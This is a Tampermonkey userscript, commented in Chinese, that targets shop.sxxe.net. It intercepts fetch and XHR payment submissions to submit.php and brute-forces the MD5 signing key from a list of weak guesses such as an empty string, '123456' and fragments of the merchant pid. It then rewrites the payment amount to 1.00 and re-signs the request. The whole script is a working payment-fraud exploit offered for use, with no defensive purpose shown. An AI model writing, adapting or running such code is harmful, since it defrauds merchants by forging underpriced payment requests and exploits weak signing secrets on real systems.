// ==UserScript==
// @name         支付金额修改器
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  修改支付金额并自动重签
// @author       You
// @match        https://shop.sxxe.net/*
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';
    
    // 尝试多个可能的密钥
    const POSSIBLE_KEYS = [
        "",  // 空字符串
        "test",
        "123456",
        "md5key",
        "epay",
        "credit",
        "linuxdo",
        "shop",
        "shopsxxe",
        "sxxe.net",
        "7d393c101aec6fbdd688b724ec576f46d03a653905221a8fdf3005e5169a5114",  // 完整pid
        "7d393c101aec6fbdd688b724ec576f46",  // pid前32位
        "d03a653905221a8fdf3005e5169a5114"   // pid后32位
    ];
    
    // 存储找到的正确密钥
    let correctKey = null;
    
    // MD5函数
    function md5(message) {
        return CryptoJS.MD5(message).toString();
    }
    
    // 签名算法
    function generateSign(params, key) {
        const sorted = Object.keys(params)
            .filter(k => k !== 'sign' && k !== 'sign_type')
            .sort()
            .map(k => `${k}=${params[k]}`)
            .join('&');
        return md5(`${sorted}${key}`);
    }
    
    // 解析参数
    function parseParams(body) {
        const params = {};
        body.split('&').forEach(pair => {
            const [key, value] = pair.split('=');
            params[key] = decodeURIComponent(value || '');
        });
        return params;
    }
    
    // 序列化参数
    function serializeParams(params) {
        return Object.keys(params)
            .map(key => `${key}=${encodeURIComponent(params[key])}`)
            .join('&');
    }
    
    // 找出正确的密钥
    function findCorrectKey(originalParams, originalSign) {
        for (let key of POSSIBLE_KEYS) {
            const testSign = generateSign(originalParams, key);
            if (testSign === originalSign) {
                console.log(`✅ 找到正确密钥: "${key}"`);
                return key;
            }
        }
        console.log("❌ 未找到正确密钥，使用第一个候选密钥");
        return POSSIBLE_KEYS[0];
    }
    
    // 修改支付请求
    function modifyPaymentRequest(body) {
        // 解析原始参数
        const params = parseParams(body);
        const originalSign = params.sign;
        
        // 如果是第一次请求，找出正确密钥
        if (!correctKey) {
            correctKey = findCorrectKey({...params}, originalSign);
        }
        
        // 修改金额
        console.log(`原金额: ${params.money}`);
        params.money = '1.00';
        console.log(`新金额: ${params.money}`);
        
        // 重新计算签名
        params.sign = generateSign(params, correctKey);
        console.log(`新签名: ${params.sign}`);
        
        return serializeParams(params);
    }
    
    // 拦截所有请求
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const [url, options = {}] = args;
        
        if (typeof url === 'string' && url.includes('submit.php')) {
            console.log('拦截支付请求:', url);
            
            if (options.body && typeof options.body === 'string') {
                try {
                    options.body = modifyPaymentRequest(options.body);
                } catch (e) {
                    console.error('修改请求失败:', e);
                }
            }
        }
        
        return originalFetch.apply(this, args);
    };
    
    // 拦截XMLHttpRequest
    if (window.XMLHttpRequest) {
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;
        
        XMLHttpRequest.prototype.open = function(method, url) {
            this._method = method;
            this._url = url;
            return originalOpen.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            if (this._url && this._url.includes('submit.php') && 
                this._method === 'POST' && body && typeof body === 'string') {
                console.log('拦截XHR支付请求');
                try {
                    const modifiedBody = modifyPaymentRequest(body);
                    return originalSend.call(this, modifiedBody);
                } catch (e) {
                    console.error('修改XHR请求失败:', e);
                }
            }
            return originalSend.apply(this, arguments);
        };
    }
    
    console.log('支付金额修改器已加载，将尝试多个密钥');
})();
